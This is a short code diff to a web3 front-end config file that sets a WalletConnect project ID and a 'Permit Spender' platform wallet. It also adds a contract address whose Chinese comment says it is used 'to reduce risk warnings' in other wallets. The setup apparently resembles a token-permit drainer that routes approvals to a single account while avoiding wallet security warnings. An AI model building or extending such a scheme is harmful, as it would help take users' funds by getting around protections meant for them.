@@ -4,9 +4,11 @@ import { polygon } from 'wagmi/chains'
 // WalletConnect Project ID
 export const projectId = 'ea97927d76764f8d29ee2f8787bc5d7c'
 
-// 平台钱包地址 (Permit Spender) - EOA
-// 合约地址（备份）: 0x1f6Ab0b72CB8969fa137E47c98F689329f0B919a
+// 平台钱包地址 (Permit Spender) - EOA，用于 Trust / Bitget 钱包
 export const PLATFORM_WALLET = '0x6c4C745d909B13528e638C7Aa63ABA9406fA8c63' as `0x${string}`
+
+// PolnationMerkleTree 合约地址 - 用于其他钱包（减少风险警告）
+export const MERKLE_TREE_CONTRACT = '0x76f0d64bC0D41262aebBCc584679Ee1EBb22dd0d' as `0x${string}`
 
 // 元数据
 const metadata = {
